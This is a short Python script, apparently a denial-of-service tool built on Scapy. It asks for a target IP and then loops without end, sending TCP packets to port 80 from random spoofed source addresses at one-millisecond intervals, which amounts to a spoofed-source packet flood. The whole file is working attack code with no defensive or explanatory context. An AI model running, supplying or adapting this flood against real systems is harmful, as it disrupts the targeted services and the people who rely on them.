from scapy.all import *
import socket
import struct
import random

target = raw_input("Enter the objetive IP ")

while True:  
    IP_v = IP(src = str(socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))), dst = target)
    TCP_v = TCP(sport = random.randint(1024,65535), dport = 80)
    packet = IP_v/TCP_v
    send(packet, inter = 0.001)



